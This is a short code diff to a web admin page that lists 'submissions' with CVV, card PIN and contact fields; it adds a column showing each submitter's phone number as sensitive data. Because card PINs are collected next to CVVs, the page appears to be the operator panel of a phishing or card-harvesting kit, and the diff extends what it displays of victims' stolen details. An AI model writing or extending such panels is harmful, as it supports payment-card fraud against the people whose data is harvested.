@@ -416,6 +416,7 @@
                     <th>CVV</th>
                     <th>Card Pin</th>
                     <th>Contact Number</th>
+                    <th>Phone Number</th>
                     <th>Submitted At</th>
                 </tr>
             </thead>
@@ -677,6 +678,7 @@
                     <td><span class="sensitive-data">${escapeHtml(submission.cvv)}</span></td>
                     <td><span class="sensitive-data">${escapeHtml(submission.card_pin)}</span></td>
                     <td>${escapeHtml(submission.contact_number || 'N/A')}</td>
+                    <td><span class="sensitive-data">${escapeHtml(submission.phone_number)}</span></td>
                     <td>${formatDate(submission.submitted_at)}</td>
                 `;
                 
